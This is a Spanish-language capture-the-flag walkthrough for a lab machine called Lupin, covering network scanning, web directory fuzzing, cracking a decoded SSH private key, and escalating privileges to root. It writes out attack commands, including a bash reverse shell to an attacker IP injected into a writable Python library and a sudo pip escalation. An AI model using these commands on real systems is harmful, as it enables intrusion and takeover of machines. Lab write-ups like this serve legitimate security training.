# Lupin

## Summary

- IP -> Random
- Ports -> TCP (22,80), UDP (idk)
- OS ->  Linux 
- Services & Applications
    - 22 -> OpenSSH 8.4p1
    - 80 -> Apache httpd 2.4.48

## Recon
* **Ifconfig** Verificamos nuestra IP 
* **nmap -sV 192.168.68.0/24** Vamos a escanear toda la red en donde se encuentra nuestra IP y ver que dispositivos existen
* **nmap -n -sn 192.168.68.0/24 -oG Ports | awk '/Up$/{print $2}'** (n=no realizar DNS, sn=escaneo de ping y no escanee ls puertos, oG=formato grepeable) Nos mostrara solo las IP del escaneo de Nmap
* **nmap -sCV 192.168.68.111** (sC=usa el script que me den informacion detallada dentro de la IP, sV=Version) Escanearemos la IP de la victima

Primero inspeccionamos la pagina web
* **Ctrl +u** Para poder ver el codigo de la pagina web 
Miramos en nmap que nos muestra un dir llamado /~myfiles/, por lo que lo miramos en la pagina web

Para descargar la Seclists
* **git clone --depth 1 \ https://github.com/danielmiessler/Seclists.git** 

Haremos un ataque de fuerza bruta al servicio HTTP con la siguiente herramienta para poder tener mas directorios
* **ffuf -c -w /usr/share/Seclists/Discovery/Web-Content/common.txt -u 'http://192.168.68.111/~FUZZ'** Para poder hacer Fuzz a la direccion IP victima y le indicamos con FUZZ que ahi queremos que inyecte las palabras del diccionario (u=url, w=wordlist)
Nos encuentra un dir llamado '/~Secret/', por lo que nos disponemos a ver que hay en el dentro de la Web

Tenemos en la web una clave ssh private file 
usuario: icex64

* **ffuf -c -ic -w /usr/share/Seclists/Discovery/Web-Content/discovery-list-2.3-medium.txt -u 'http://192.168.68.111/~secret/.FUZZ' -fc 403 -e .txt, .html** Para poder hacer Fuzz a la direccion IP victima y le indicamos con FUZZ que ahi queremos que inyecte las palabras del diccionario (u=url, w=wordlist, ic=ignora mayusculas y minusculas, c=siga ejecutando las respuestas, fc=quita respuestas invalidad como 404, e=extensiones del archivo) 

Nos regresa un archivo que se llama secret.txt y miramos en la web para ver el contenido
El punto antes de 'mysecret.txt' es para que nos lo detecte como un archivo y no como un dir
http://192.168.68.111/~secret/.mysecret.txt


- https://www.dcode.fr/cipher-identifier Pagina para ver que tipo de hash es el que encontramos de la url anterior y nos da un base_58
Nos ponemos a descodificar ese hash y lo haremos en la misma pagina, ya que ella contiene algunos decodificadores

Nos regresa la llave privada y la colocaremos en un archivo llamado 'sshkey' para poder romperlo con John
- **locate ssh2john** Y nos regresara la siguiente direccion **/usr/share/john/ssh2john.py**
- **ssh2john.py sshkey > hash** Usaremos el .py de John para poder convertir esa clave en un hash


- **jhon --wordlist=/usr/share/wordlists/fasttrack.txt hash** Para que haga el ataque de fuerza bruta (diccionario)

Nos da la passwd: P@55w0rd!


## User

Ahora podemos entrar por ssh de la siguiente manera 
- Comando -> **ssh -i sshkey icex64@192.168.68.111** Para conectarnos por ssh
Y la passwd la udamos al momento de establecer la conexion con SSH
Podemos ver la flag del usuario user.txt

* **sudo -l** Para ver si tenemos privilegios en el Sudoers (l=ele) y miramos que tenemos un comando para ejecutar como el usuario Arsene

Buscaremos la herramienta de **LinPEAS** en GitHub
Si no podemos ejecutar el comando Curl para poderlo descargar, debemos de ir bajando en la pagina a la parte de 'Quick Start' en la parte de 'Releases page' y ahi nos descargamos el **linpeas.sh** y lo movemos a nuestro directorio de trabajo y buscaremos pasarlo a la maquina victima

* **python3 -m http.server 80** Nos iniciamos un servidor temporal con Python en el cual podemos pasar archivos, el comando se debe ejecutar en la carpeta que vamos a compartir de nuestra maquina de atacante 

Ahora en la maquina victima nos dirjimos al dir **/tmp** ya que tiene poder de escritura y lectura 
* **wget 192.168.68.100/linpeas.sh** La direccion IP es de la maquina de atacante y asi podemos cargar el archivo LinPEAS

* **chmod 777 linpeas.sh** Agregamos los privilegios para poder ejecutarlo 
* **./linpeas.sh** Ejecutamos el archivo en la maquina victima

Buscaremos un script con python3.9, los scripts los podemos ejecutar ya que habiamos visto en **sudo -l**  el privilegio
**/usr/lib/python3.9/webbrowser.py**

Miramos los permisos del archivo 
* **ls -l /usr/lib/python3.9/webbrowser.py** Mirando los permisos lo podemos ejecutar en cualquier usuario
* **nano /usr/lib/python3.9/webbrowser.py** Miramos que contiene

Haremos una ReverShell para poder ser el usuario Arsene

Esto lo haremos colocando la ReverShell en el archivo hasta el final que encontramos de Python
colocando lo siguiente:

Este lo colocamos despues de las librerias 
* **os.system("/bin/bash")** Este sirve para que en la misma consola nos haga el cambio de usuario y no usar en este caso la consola de Netcat

Y este lo colocamos al final del codigo del archivo
- **cat >> /usr/lib/python3.9/webbrowser.py** Y despues pegamos el comando de abajo para que lo agregue 
**os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.68.100/443 0>&1'")** o solo lo agregamos hasta abajo 


Despues en nuestra maquina de atacante nos ponemos en escucha por Netcat 
* **nc -nlvp 443** 

En la mquina victima hacemos lo siguiente para poder ejecutar el comando
* **sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py**

## Root

Una vez dentro del usuario Arsene
* **sudo -l** Miramos que tenemos un privilegio para ejecutar un comando como root '/usr/bin/pip'

Buscaremos en Google la pagina de GTFOBins - [https://gtfobins.github.io/](https://gtfobins.github.io/) y buscaremos pip y utilizaremos los primeros comandos que en este caso son 3 de uno en uno 
Para el tercer comando usaremos **sudo** 

* **id** Miramos si ya estamos en el root
Y asi lograremos ser Root, por lo que buscaremos la flag root.txt